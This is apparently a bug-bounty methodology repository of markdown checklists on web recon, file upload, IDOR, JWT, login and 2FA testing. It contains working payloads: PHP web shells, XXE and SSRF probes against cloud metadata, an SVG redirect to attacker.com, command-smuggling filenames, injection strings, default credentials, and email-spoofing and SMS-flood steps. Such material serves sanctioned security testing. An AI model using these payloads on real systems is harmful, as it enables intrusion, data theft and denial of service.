<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-alihussainzada
description: CTF writeups and security challenges by alihussainzada.
---

# Writeups by alihussainzada

Source repository: `/repos/alihussainzada`

## Repository Index

- BugHunterMethodology/README.md
- BugHunterMethodology/Checklist/README.md
- BugHunterMethodology/Methodology/README.md
- BugHunterMethodology/webAppRecon/README.md
- BugHunterMethodology/Methodology/Methodology Flow/Authentication Class.md
- BugHunterMethodology/Methodology/Methodology Flow/CORS Misconfigure.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Request Forgery.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS).md
- BugHunterMethodology/Methodology/Methodology Flow/Fuzzing on various properities.md
- BugHunterMethodology/Methodology/Methodology Flow/HTTP Request Smuggling.md
- BugHunterMethodology/Methodology/Methodology Flow/Insecure direct Object Reference (IDOR).md
- BugHunterMethodology/Methodology/Methodology Flow/LFI Directory Traversal.md
- BugHunterMethodology/Methodology/Methodology Flow/Mass assignment.md
- BugHunterMethodology/Methodology/Methodology Flow/Open Redirect.md
- BugHunterMethodology/Methodology/Methodology Flow/SQL Injection.md
- BugHunterMethodology/Methodology/Methodology Flow/Server Site Request Forgery (SSRF).md
- BugHunterMethodology/Methodology/Methodology Flow/Sever Site Template Injection (SSTI).md
- BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS.md
- BugHunterMethodology/Methodology/Methodology Flow/What to do.md
- BugHunterMethodology/Methodology/Methodology Flow/XXE.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/Dom Based XSS.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/Methodology.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/Payloads.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/WAF Bypass.md
- BugHunterMethodology/Methodology/Methodology Flow/Cross Site Scripting (XSS)/XSS Discovery.md
- BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/Django.md
- BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/Laravel.md
- BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/React.md
- BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/WordPress.md
- BugHunterMethodology/Checklist/Check List/403 bypass.md
- BugHunterMethodology/Checklist/Check List/Account Takeover.md
- BugHunterMethodology/Checklist/Check List/Admin Panel.md
- BugHunterMethodology/Checklist/Check List/Blind XSS.md
- BugHunterMethodology/Checklist/Check List/Directory Traversal.md
- BugHunterMethodology/Checklist/Check List/Email Spoofing on DOMAIN.md
- BugHunterMethodology/Checklist/Check List/File upload.md
- BugHunterMethodology/Checklist/Check List/Finding OriginIP.md
- BugHunterMethodology/Checklist/Check List/Flaws of SMS auth.md
- BugHunterMethodology/Checklist/Check List/IDOR Check List.md
- BugHunterMethodology/Checklist/Check List/JWT.md
- BugHunterMethodology/Checklist/Check List/JavaScript Analysis.md
- BugHunterMethodology/Checklist/Check List/Login Panel Registration.md
- BugHunterMethodology/Checklist/Check List/MFA 2FA Bypasses.md
- BugHunterMethodology/Checklist/Check List/Race Condition.md
- BugHunterMethodology/Checklist/Check List/Rate limiting Bypass.md
- BugHunterMethodology/Checklist/Check List/Reset Forget Password.md
- BugHunterMethodology/Checklist/Check List/Web Cache Deception.md
- BugHunterMethodology/Checklist/Check List/WebApp works with COOKIES.md
- BugHunterMethodology/Checklist/Check List/information disclosure.md
- BugHunterMethodology/Checklist/Check List/File upload/File Upload Bypasses.md
- BugHunterMethodology/Checklist/Check List/File upload/Vulnerabilities.md
- BugHunterMethodology/Checklist/Check List/Finding OriginIP/Did you find an Origin IP GREAT! 698c63f537a84313a04d3c9ecda84869.md

## Writeup Content


### File: BugHunterMethodology/Checklist/README.md

# Check List

- If the response is sensitive try to: 1. CORS Misconfiguration, WCD, and IDOR
- Do you have reflection? Test XSS, SSTI, content spoofing …
- A limited task? So, Try Race Condition

[Finding OriginIP ](Check%20List/Finding%20OriginIP.md)

[WebApp works with COOKIES?](Check%20List/WebApp%20works%20with%20COOKIES.md)

[IDOR Check List](Check%20List/IDOR%20Check%20List.md)

[Login Panel/Registration](Check%20List/Login%20Panel%20Registration.md)

[Reset/Forget Password](Check%20List/Reset%20Forget%20Password.md)

[Account Takeover](Check%20List/Account%20Takeover.md)

[Web Cache Deception](Check%20List/Web%20Cache%20Deception.md)

[Flaws of SMS auth](Check%20List/Flaws%20of%20SMS%20auth.md)

[File upload !](Check%20List/File%20upload.md)

[Email Spoofing on DOMAIN](Check%20List/Email%20Spoofing%20on%20DOMAIN.md)

[JWT](Check%20List/JWT.md)

[Race Condition](Check%20List/Race%20Condition.md)

[Directory Traversal](Check%20List/Directory%20Traversal.md)

[403 bypass](Check%20List/403%20bypass.md)


[information disclosure](Check%20List/information%20disclosure.md)

[JavaScript Analysis](Check%20List/JavaScript%20Analysis.md)

[MFA/2FA Bypasses](Check%20List/MFA%202FA%20Bypasses.md)

[Admin Panel](Check%20List/Admin%20Panel.md)

[Rate limiting Bypass](Check%20List/Rate%20limiting%20Bypass.md)

[Blind XSS](Check%20List/Blind%20XSS.md)


### File: BugHunterMethodology/Methodology/README.md

# Methodology/Flow

The methodology to detect vulnerabilities

[What to do?](Methodology%20Flow/What%20to%20do.md)

[Fuzzing on various properities](Methodology%20Flow/Fuzzing%20on%20various%20properities.md)

[CORS Misconfigure](Methodology%20Flow/CORS%20Misconfigure.md)

[Cross Site Scripting (XSS)](Methodology%20Flow/Cross%20Site%20Scripting%20(XSS).md)

[Insecure direct Object Reference (IDOR)](Methodology%20Flow/Insecure%20direct%20Object%20Reference%20(IDOR).md)

[Open Redirect](Methodology%20Flow/Open%20Redirect.md)

[HTTP Request Smuggling](Methodology%20Flow/HTTP%20Request%20Smuggling.md)

[Cross Site Request Forgery](Methodology%20Flow/Cross%20Site%20Request%20Forgery.md)

[Server Site Request Forgery (SSRF)](Methodology%20Flow/Server%20Site%20Request%20Forgery%20(SSRF).md)

[Mass assignment ](Methodology%20Flow/Mass%20assignment.md)

[Technologies and CMS](Methodology%20Flow/Technologies%20and%20CMS.md)

[Authentication Class](Methodology%20Flow/Authentication%20Class.md)

[XXE](Methodology%20Flow/XXE.md)

[Sever Site Template Injection (SSTI)](Methodology%20Flow/Sever%20Site%20Template%20Injection%20(SSTI).md)

[LFI/Directory Traversal](Methodology%20Flow/LFI%20Directory%20Traversal.md)

[SQL Injection](Methodology%20Flow/SQL%20Injection.md)


### File: BugHunterMethodology/README.md

# Bug Bounty Methodology

This repository provides a structured bug bounty methodology, offering a step-by-step approach to vulnerability discovery and exploitation. It's built from numerous resources and personal insights, focusing on practical tools and techniques for successful bug hunting.

- **[Web App Recon](https://github.com/alihussainzada/BugHunterMethodology/tree/main/webAppRecon
)**: Resources and techniques for effective web application reconnaissance to identify attack surfaces.
- **[Methodology or Flow](https://github.com/alihussainzada/BugHunterMethodology/tree/main/Methodology)**: A comprehensive workflow for identifying, analyzing, and exploiting various vulnerabilities.
- **[Checklist](https://github.com/alihussainzada/BugHunterMethodology/tree/main/Checklist)**: Detailed checklists for each type of vulnerability to ensure thorough coverage during testing.

## Contents

- **Vulnerability Workflow and Methodology**: A comprehensive flow for identifying, analyzing, and exploiting various vulnerabilities.
- **Payloads**: A collection of payloads for testing common web application vulnerabilities.
- **Bug Checklists**: Detailed checklists for each type of vulnerability, ensuring thorough coverage and testing.
- **Bypass Techniques**: Methods for bypassing common security defenses to increase the chances of finding vulnerabilities.
- **Tricks and Techniques**: Handy tips and advanced techniques for improving your bug-hunting efficiency and effectiveness.


## Contributing

If you have additional insights, new techniques, or payloads that could enhance this methodology, contributions are welcome. Please submit a pull request to help make this resource more valuable for the community.




### File: BugHunterMethodology/webAppRecon/README.md

# WebApp Recon

In the recon process, we aim to map the application as much as possible. In order to achieve this, various techniques shroud be used:

- Google Dorks
- GitHub, Bit bucket and etc searches
- Determine the framework or CMS
- Virtual host discovery
- Using Archives (WayBackMachine, OTX, etc)
- Crawl web application
- Resource discovery
- Fuzzing on various properties
- Goals of this section
    1. To extract URLs and Js files
    2. To extract file names
    3. To extract Parameter
    4. To extract endpoints
    5. To discover hidden parameters, files and endpoints

## Google Dorks

To search in third parties

```bash
site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http:// | site:http://ideone.com | site:http://ideone.com | 
```

To search for indexes with `inurl`, `ext`, `link`, `site`, `intitel`

```bash
site:domain.tld inurl:&
site:domain.tld ext:(php|aspx|txt|jsp|html|xml|bak)
site:domain.tld inurl:(unsubscribe|register|feedback|signup|join|contact|user|profile|api|developer|affiliate|mobile|upload|pgrade|password) inurl:&
site:domain.tld ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:ora | ext:ini
site:domain.tld ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv 
site:domain.tld ext:sql | ext:dbf | ext:mdb | ext:log
site:domain.tld ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup
site:domain.tld inurl:login | inurl:login | inurl:signin | intitle:Login | intitle:signin | inurl:auth 
site:domain.tld ext:action | ext:struts | ext:do
site:domain.tld filetype:wsdl | filetype:WSDL | exy:svc | inurl:wsdl | Filetype:?wsdl | intitle:_vti_bin/sites.asmx?wsdl | inurl:_vti_bin/sites.asmx?wsdl 
site:domain.tld filetype:config
site:*.domain.tld
site:*.*domain.tld
### Finding buckets of site:
site:.s3.amazonaws.com "domain.tld"
site:amazonaws.com "domain.com"
amazonaws s3 domain.com
amazonaws bucket domain.com
amazonaws domian.com
s3 domian.con

link:domain.tld
site:stackoverflow.com "domain.tld"
```

- I have collected these:

```
site:*.target.* intext:@gmail.com -> useful from twitter
```

Use these tree sites:

1. [Google Dorks for Bug Bounty](https://taksec.github.io/google-dorks-bug-bounty/)

2. [https://pentest-tools.com/information-gathering/google-hacking](https://pentest-tools.com/information-gathering/google-hacking)
3. [dorksearch](https://dorksearch.com/)
4. [https://dorkgenius.com/](https://dorkgenius.com/)

## Determine the framework or CMS

The wappalayzer is a good tool, the add-on or CLI

## Virtual host discovery

```bash
host: [FUZZ]
host: [FUZZ].domain.tld
host: [ALL_SUBDOMAIN]
```

## Extract

**some useful sites**

- [https://archieve.org](https://archieve.org) - a great source to travel in time
- [https://commoncrawl.org](https://commoncrawl.org) - great source of sites which have already crawled
- Hakrawler - a good crawler written in go
- GoSpider - a good crawler - supports many third parties (is recommended)
- GAU - a tool (passive, but supports actives mode)
- LinkFinder - a tool to discover endpoints and their parameters in JS files
- burpsuite
    
    Manually browsing the website, generate a site map
    
    Using spidering feature in the burp suite
    

The flow is like:

Find All Urls (gospider) ⇒ Find hidden links from JS files (LinkFinder) ⇒ httpx

for Mass and Manual Tests

## Fuzzing to discover

The aim to discover following properties

- File names
- parameters name
- endpoints

See the methodology!


### File: BugHunterMethodology/Checklist/Check List/403 bypass.md

# 403 bypass

- [ ]  Run GitHub tools on it
- [ ]  search in WayBack about this subdomain you can find any important path
- [ ]  Try to fuzz it, Run GoSpider
- [ ]  Google dork


### File: BugHunterMethodology/Checklist/Check List/Account Takeover.md

# Account Takeover

Here we go again:

- [ ]  change Email send a confirmation link
- [ ]  Pre-account Takeover
- [ ]  Improper rate limiting
- [ ]  Open redirect

### How to test them:

- Change Email
    1. Change your email to you second email and send the confirmation link to victim
    2. victim clicks, and your email connects to victim’s account
- Open Redirect
    - If the app works with Oauth as well, this attack is possible. Just change the `redirect_uri` value to yours
-


### File: BugHunterMethodology/Checklist/Check List/Admin Panel.md

# Admin Panel

Try out these dudeeeee :)

- [ ]  Default Credentials
- [ ]  Bypass by SQL injection
- [ ]  XSS (Blind)
- [ ]  Response Manipulation
- [ ]  Directory Fuzzing
- [ ]  Check JS files
- [ ]  Check Comment (Source Code Clt + U)
- [ ]  X path, No Sql injections

## How to do:

- Default Credentials
    
    ```
    admin:admin
    admin:password
    author:author
    administrator:password
    admin123:password
    username:pass12345
    ```
    
    and use sites ..
    
- Bypass by SQL injection
    - 
- XSS
    - inject username or password with xss payloads
    - parameter discovery
- Response Manipulation
    
    ```
    change the status of response from 
    200 => 302
    failed => success
    error => success
    403 => 200
    403 => 302
    false => true
    ```
    
- Check JS file
    - look for credentials or path, parameter, …
- X path
    
    ```
    ' or '1'='1
    ' or ''='
    ' or 1]%00
    ' or /* or '
    ' or "a" or '
    ' or 1 or '
    ' or true() or '
    'or string-length(name(.))<10 or'
    'or contains(name,'adm') or'
    'or contains(.,'adm') or'
    'or position()=2 or'
    admin' or '
    admin' or '1'='2
    ```


### File: BugHunterMethodology/Checklist/Check List/Blind XSS.md

# Blind XSS

Test this

1:- Use [https://github.com/Leoid/MatchandReplace](https://github.com/Leoid/MatchandReplace)
2:- Import to burpsuite match and replace.
3:- Run gospider. gospider -s url -a -w --sitemap -r -c 100 -d 8 -p [http://127.0.0.1:8080](http://127.0.0.1:8080/)
4:- The Blind xss payload will added automatically by burp and gospider.
Finally:- 4 BLIND XSS REPORTS.

distinguish parameterized urls and add it to burp


### File: BugHunterMethodology/Checklist/Check List/Directory Traversal.md

# Directory Traversal

- Try to distinguish which images are Static and which are dynamic
- When you see “/`_nuxt/@fs`” in JS or in HTML, that means the Dev Is enabled so, `/_nuxt/@ft/etc/passwd` add in URL.
- 

Bypasses:

```
1. use double // like -> //etc/passwd
```


### File: BugHunterMethodology/Checklist/Check List/Email Spoofing on DOMAIN.md

# Email Spoofing on DOMAIN

## Email Spoofing

Attacker can send Email on behalf of Company when the bellow conditions meet:

1. Lack of an SPF or DMARK
2. SPF record never specifies -all or ~all
3. DMARK policy is set to p=none or is nonexistent 

### **For check:**

- Use the [https://github.com/BishopFox/spoofcheck](https://github.com/BishopFox/spoofcheck) to check SPF/ DMARK
- Or use, the site : [click](https://mxtoolbox.com) (DMARK lookup, SPF Record lookup)

### For exploit:

- For exploit navigate to this site : [click](http://emkei.cz)
- No SPF, and NO DMARC is found so vulnerable sometimes if there is DMARC is found but still vulnerable
- Install Hunter extension in order to find any email regarding to the sites or doing it on any domain :)


### File: BugHunterMethodology/Checklist/Check List/File upload.md

# File upload !

When you have file upload functionality these types of vulnerabilities are possible:

- **The flow**
    - Test all file Extension
    - you can not upload .php file make it PhP
    - make it test.jpg.php → check the existence of jpg
    - your delimiters (null byte and more)
    - 

[Vulnerabilities](File%20upload/Vulnerabilities.md)

[File Upload Bypasses](File%20upload/File%20Upload%20Bypasses.md)


- **Complete guide :**
    - Extensions Impact
        - `ASP,` `ASPX`, `PHP5`, `PHP`, `PHP3`: **Webshell RCE**
        - `SVG`: **Stored XSS, SSRF, XXE**
        - `GIF`: **Stored XSS, SSRF**
        - `CSV`: **CSV injection**
        - `XML`: **XXE**
        - `AVI`: **LFI, SSRF**
        - `HTML:` **Html injection, XSS, open redirect**
        - `PNG`, `JPEG`: **Pixel flood Attack / metadata leakage / s-s-i in its name**
        - `ZIP`: **RCE via LFI, DoS**
        - `PDF`, `PPTX`: **SSRF, Blind XXE**
    - Blacklisting Bypass
        - PHP → .`phtm` , `phtml` , .`phps` , .`pht` , .`php2` , .`php3` , .`php4` , .`php5` , .`shtml` , .`phar` , .`pgif` , .`inc`
        - ASP → `asp` , .`aspx` , .`cer` , .`asa`
        - Jsp → .`jsp` , .`jspx` , .`jsw` , .`jsv` , .`jspf`
        - Coldfusion → .`cfm` , .`cfml` , .`cfc` , .`dbm`
        - Using random capitalization → .`pHp` , .`pHP5` , .`PhAr`
    - Whitelisting Bypass
        - `file.jpg.php`
        - `file.php.jpg`
        - `file.php.blah123jpg`
        - `file.php%00.jpg`
        - `file.php\x00.jp`g this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in
        
        hex to 00.
        
        - `file.php%00`
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php.....`
        - `file.php/`
        - `file.php.\`
        - `file.`
        - `.html`
    - Vulnerabilities
        - [ ]  Directory Traversal
        1. Set filename 
        2. Set filename `../../../logo.png` as it might changed the website logo.
        - [ ]  SQL Injection
        1. Set filename `'sleep(10).jpg`.
        2. Set filename `sleep(10)-- -.jpg` .
        - [ ]  Command Injection
        1. Set filename 
        - [ ]  XXE
        1. Upload using `.svg` file
        
        ```bash
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
        <text font-size="40" x="0" y="16">&xxe;</text>
        </svg>
        ```
        
        1. Upload excel file
        - [ ]  XSS
        1. Set file name `<svg onload=alert(document.comain)>`
        2. Upload using .`svg` file
        
        ```bash
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        File Upload Checklist3<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        <script type="text/javascript">
        alert("HolyBugx XSS");
        </script>
        </svg>
        ```
        
        - [ ]  Open Redirect
        1. Upload using .svg file
        
        ```bash
        	<code>
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <svg
        onload="window.location='https://attacker.com'"
        xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        </svg>
        </code>
        ```
        
    - Content-ish Bypass
        - [ ]  Content-type validation
        1. Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
        - [ ]  Content-Length validation
        1. Small PHP Shell
        
        ```bash
        (<?=`$_GET[x]`?>)
        ```
        
        - [ ]  Content Bypass Shell
        1. If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )
        
        ```bash
        GIF89a; <?php system($_GET['cmd']); ?>
        ```
        
    - Misc
        - [ ]  Uploading `file.js` & `file.config` (web.config)
        - [ ]  Pixel flood attack using image
        - [ ]  DoS with a large values name:
        - [ ]  Zip Slip
        1. If a site accepts .zip file, upload .php and compress it into .zip and upload it. Now visit, site.com/path?page=zip://path/file.zip%23rce.php
        - [ ]  Image Shell
        1. Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file mv pic.jpg pic.php.jpg
        
        ```bash
        exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
        ```
        
- The webapp is php based and the file you upload is accessible
- bypass the restrictions ( well be discussed )
- **File overwrite**
    - Create a system file like /etc/passwd
    - Upload the file and Capture the request
    - Modify the the request by changing the **filename parameter** to **../../../../../etc/passwd**
- **Path Traversal** = is the same as above but not system files
- **Large File DoS**
    - make an img file with size of 500mb
    - Upload it and check it out it accepts or not
- **Server-Side Injection (Sql inj & Os command)**
    - Upload your file and capture the request
    - change its name to name=test.png —> name=sleep(10)— -.png (for SQL)
    - change its name to name=test.png —> name=test;sleep(9);.png (for OS Injection)
    - It is Also possible to test XSS
- **Metadata Leakage**
    - As known, EXIF Metadata Leakage/Information Leakage
    - Not all of ‘em are vulnerable, and not images are vulnerable yet PDFs upload are too!
    - Upload your image, and click on the uploaded image COPY its link
    - Now, use [this site](http://exif.regex.info/exif.cgi)  to check the image for EXIF data leakage.
    - This GitHub repository is might be useful https://github.com/ianare/exif-samples
- Pixel Flood Attack
    - An Attacker can upload an image with a large pixel size that results in DoS
    - To test, navigate to [https://www.resizepixel.com](https://www.resizepixel.com) and resize an image with 64250*64550px.
    - Upload the image, and observe the server’s response.
    - If the server takes too long to respond or if the application became inaccessible, confirm with another device
- **Cross Site Scripting (XSS)**
    - XSS via SVG file upload
        - Create an SVG file containing a cross-site scripting payload (PayloadAllTheThings)
        - Upload the file
        - open the SVG file or Go to the endpoint that calls the SVG file
    - XSS via Image Name
        - Create any file, e.g. a PNG file and name it with XSS payload like the following
        - <script>alert(origin)</script>.png
        - Upload your file and Go to the endpoint that calls the files or stores the files
        
- **CSV injection**
    - I will read about it
- **Open Redirect**
    - application allows to upload an HTML file, and we XXS is limited
    - but the file renders not download and locally renders
    - I will read about it
- **SSRF**
    - SSRF vial html uplaod
        - if webapp allows html upload and js code are limited
        - upload an HTML file containing a malicious `iframe`, `src`, `srcdoc`, `script`
        - file contains the code’s bellow
        
        ```bash
        <body>
        	<iframe src="http://169.254.169.254/latest/meta-data" ></ifram>
        </body>
        ```
        
        - upload it, and open it up https://amir.com/uploaded/ssrf.html
    - SSRC in File Upload through URL:
        - you have a functionality to upload a file through a link
        - Fuzz the endpoint with the internal SSRF Payloads
- **XML External Entities**
    - Trough SVG file Upload
        - create a file containing a malicious xml codes
        - Upload and Open it


### File: BugHunterMethodology/Checklist/Check List/File upload/File Upload Bypasses.md

# File Upload Bypasses

Here some bypasses 

- Null Byte (%00) Bypasses or fuzz:
    
    `test.php` → `test.php%00.jpg or test%00.php`
    
    ```bash
    test.php%0A.jpg
    test.php\n.jpg
    test.php\u000a.jpg
    test.php\u560a.jpg
    test.php#.jpg
    test.php%23.jpg
    test.php\u003b.jpg
    test.php;.jpg
    ```
    
- Nth Extentsion Bypasses:
    
    `test.php` → `test.jpg.php`
    
- Change the content type
- Magic Byte Bypasses
- Client Side Validation Bypass
- Block List Bypass
    
    `test.php, test.php3, test.pHP`
    
- Homographic Character Bypass:
- test.php → test.P hp ( p is different ) site is useful https://www.irongeek.com/homoglyph-attack-generator.php
    
    ```bash
    file upload vunlerability:
    
    upload a .php file
    for bypasses: 
    1- make it ali.php%00.png
    2- make it ali.php5 --> alternatives
    3- make it ali.php.
    4- make it ali.p.php.hp
    5- make a pic with .png and add your <?php system('id') ?> at the end
    6- change "filename=ali.png" to filename="ali||sleep 30||.png" in the request
    ```


### File: BugHunterMethodology/Checklist/Check List/File upload/Vulnerabilities.md

# Vulnerabilities

1.  XSS
2. XML External Entities
3. SSRF
4. RCE
5. Large File DoS
6. Pixel Flood Attack
7. ImageTtagik
8. Malicious File Upload
9. Zip Slip Attack
10. File overwrite
11. Path Traversal
12. Misc File Upload Attack
13. Open Redirect
14. Metadata leaks
15. Server-Site injection


### File: BugHunterMethodology/Checklist/Check List/Finding OriginIP.md

# Finding OriginIP

- If an IP loads its easy, if it is not load it might have two possibilities
    - WAFF does not allow ( we can do nothing )
    - Host header does not match ( use matcher)
    
    ```bash
    curl "http://129.22.23.1" -H "host: example.com" -k
    ```
    

### Basic Recon

- Use GitHub tool called `cloud flair`
- Find as much subdomain as you could (dns brute, subfinders, permutatins…)
- Find all their IPs and exclude all IPs that are related to CDNs
- Find CIDRs from IPs and match the host headers
- To match use hakluke tools (it gets IPs and Host and sends a curl and filters content-type)
- cat Ips | hackluke -s example or:

```bash
ffuf -w ips.txt -u https://FUZZ -H "host: example.com"
```

### IoT Search Engines

- Use cencys
- Use shodan
- Use Zoomeye

### FavIcon Hashes

- Use the tool Murmurhash to find a website favicon’s hashes
- search it on Shodan (has its dork)

### SSRF or pindback (xml-rpc)

- in WordPress xml.rpc.php and make a post request to it

### Email header leakage

- Find a functionality that sends an email to you
- Register with user@burp-collub.con
- check its header (right site in the email)

### Security Trails & recond cloud

- Use security trails ( ip history)
- https://recon.cloud

[Did you find an Origin IP? GREAT!](Finding%20OriginIP%209d29d1ad020549ffaa49abb2bd8c279d/Did%20you%20find%20an%20Origin%20IP%20GREAT!%20698c63f537a84313a04d3c9ecda84869.md)


### File: BugHunterMethodology/Checklist/Check List/Finding OriginIP/Did you find an Origin IP GREAT! 698c63f537a84313a04d3c9ecda84869.md

# Did you find an Origin IP? GREAT!

- Do Host Header Fuzzing
    - keep dead subs in order to fuzz
    - find origin IP, in Chat Box print your URL
    - trigger port scanning (nmap - Pn -F)
    - fuzz for -H (ffuf -w subs -u http://IP:Port/ -H “host: FUZZ” -fc 403 -c
    - if you find something(it responds), again fuzz for directory, if it does not respond to it in all IPs
    - send a curl request in order to find whether it responds or not
    - Use Boom word list
- Use your tools
    - Virtual-host-scanner from jobert abma
    - https://github.com/wdahlenburg/VhostFinder used
    
- Do nmap


### File: BugHunterMethodology/Checklist/Check List/Flaws of SMS auth.md

# Flaws of SMS auth

There are some tests:

- [ ]  SMS flood
- [ ]  Lack of rate limit
- [ ]  Response Manipulation
- [ ]  Users get disable (Ddos)
- [ ]  Response Disclosure

## How to test them

- SMS flood
    - can you send the code many times,
- Lack of rate limit
    - it should be expiredable bcz it is easy to guess 4-6 digits
- Response Manipulation
    - Enter an arbitrary code, copy the success response and paste it to wrong request
- Ddos
    - send so many requests from victim and make them to be not login
- Response Disclosure
    - Check the response sometimes the response reveals the code


### File: BugHunterMethodology/Checklist/Check List/IDOR Check List.md

# IDOR Check List

- [ ]  Try parameter pollution 
- [ ]  Add parameters to the endpoints which return the information  | make you own list (JavaScript)
- [ ]  Use Extension /user/01 → /user/02.json
- [ ]  Special Characters 
- [ ]  Try old version `/api/v3/users/01` → `/api/v1/users/02`
- [ ]  Change Request method → GET, POST, PATCH, DELETE, PUT
- [ ]  Check Referrer or some other Headers are used to validated the IDs. | click here
- [ ]  Encrypted IDs, Try to decode using [hashes.com](http://hashes.com) or other tool
- [ ]  Swap GUID with Numeric ID or email
- [ ]  Try GUIDs such as: 0000-0000-000-00000000 and 1111-11111-11111111-111111
- [ ]  GUID Enumeration: Try to disclose GUIDs using Google Dorks, GitHub and so on 
- [ ]  If none of the GUID Enumeration methods work then try: Sign Up, Reset Password, Other endpoints within app and analyze response. These endpoints mostly disclose user’s GUID (or their profile)
- [ ]  403/401 Bypasses: If server responds back with a 403/401 then try to use burp intruder and send 50-100 request having different IDs: from /user/01 → /user/100
- [ ]  If server response with a 403/401, double check the function within the app. Sometimes 403/401 is thrown but the action is performed.
- [ ]  Chain IDOR with XSS for account takeover


### File: BugHunterMethodology/Checklist/Check List/JWT.md

# JWT

- Application just decodes not verify, meaning change role to another user or admin
- Change the alg to none.
- the alg is HS256, and it means signature is symmetric try to bruteforce it
- 
- [ ]  Support for the none algorithm
- Try these
    
    ```
    none
    None
    NONE
    nOnE
    ```
    
- [ ]  Lack of valid signature
- Try this
    
    ```
    Change the signeture algorithm (e.g. HS256) and remove the signature section (the 3rd part)
    because the RS256 uses ASYMETRIC and SYMMETRIC, but HS256 uses JUST SYMMETRIC to verfify.
    but the RS public key might be availble publicky, So chagne to HS256 and use the public key of RS256 
    ```
    
- [ ]  Disclose of a correct signature
- Try this
    
    ```
    Try to change a payload and send such token to an API endpoint (remove the 3rd part of it)
    ```
    
- [ ]  Weak an HMAC secret key
- Try it
    
    ```
    
    ```
    
- [ ]  Brute force
- The Tools
    
    ```
    
    ```
    
- [ ]  Signature not been checked
- Try it out
    
    ```
    if the programmer forgets to check it, so you can remove it change it and so on.
    ```


### File: BugHunterMethodology/Checklist/Check List/JavaScript Analysis.md

# JavaScript Analysis

I divided the process into 2 parts.

What do we look for?

- The links to increase the attack surface (hidden endpoints)
- Sensitive information (Password, API keys, Emails)
- Dangerous code (DOM, Eval ..)

## Manually Analysis

- We can use chrome browser in order to perform this task (tomnomnom method)
- Spider the app, add extract the sitemap from Burp Suite

## Automated Analysis

- Collect all js extension from wayback, katana, gospider (they may be dead, filter them alive)
- Run Secret Finder tool against all of them (the command is bellow)
- The SecretFinder command
    
    ```
    cat all-js-tosecret | while read url ; do python3 SecretFinder.py -i $url -o cli >> secret.txt; done
    # Run link finder against all url, not just js files
    ```
    
- Run LinkFinder to find Links (command is the same)
-


### File: BugHunterMethodology/Checklist/Check List/Login Panel Registration.md

# Login Panel/Registration

## Login:

- [ ]  Blind XSS, in username and password
- [ ]  Check `.js` file on the page, such as `login.js`
- [ ]  Check the parameters used on the endpoint
    - Might be listed in the `source`
- [ ]  Checking the Mobile Endpoint
    - Does it have the same protection as webapp?
    - How does it treat Unicode characters?
- [ ]  Google Dorks, and try much more
    - `site:example.com inurl:register inurl:&`
    - `site:example.com inurl:signup inurl:&`
    - `site:example.com inurl:join inurl:&`
- [ ]  Brute Force UserName:Password (rate limit)
- [ ]  SQL injection e.g. `‘ or '1'=1#` or `‘ or ‘1’=’1—`
- [ ]  Hidden parameter discover
- [ ]  Directory fuzz

## Registration

- XSS (Blind)
    - for email: <svg/onload=alert(origin)>”@gmail.com
- Duplicate Registration
    - Try to generate using an existing username
        - ali@gmail.com ⇒ Ali@gmail.com `or` with the different password.
        - uppsecase
        - +1@
        - add special char `%00`, `%09` and `%20`
        - victim@attacker.com@gmail.com
        - victim@gmail.com@attacker.com
- check password length is limited or not
    - try to add limitless amount of characters lead to DDOS
- Email Takeover
    - add a new Email, before confirming, check if the new confirmation email is sent to the first registered email. If it send code to your number try it too, (old code new number)
- pre-account takeover
- email enumeration
    - Chech you can figure out registered users inside the app
- leaking PII information
    - Sign up an existing users, the errror may leak more info (PII)
- Path overwrite
    - name your username as `index.php` to occupy the app path


### File: BugHunterMethodology/Checklist/Check List/MFA 2FA Bypasses.md

# MFA/2FA Bypasses

It is just another layer of security mechnism to verify usere identity, So when a Hacker has access to victim’s credintials he/she can not log in to victims account

## Methodology:

- [ ]  Resoponse Manipulation
- [ ]  2FA code leakage in response
- [ ]  2FA re-usability / from another account
- [ ]  Lack of brute force (no rate limiting)
- [ ]  Direct Request/Forceful browsing
- [ ]  CSRF & ClickJacking on 2FA disable Feature
- [ ]  Bypassing 2FA by sending blank code
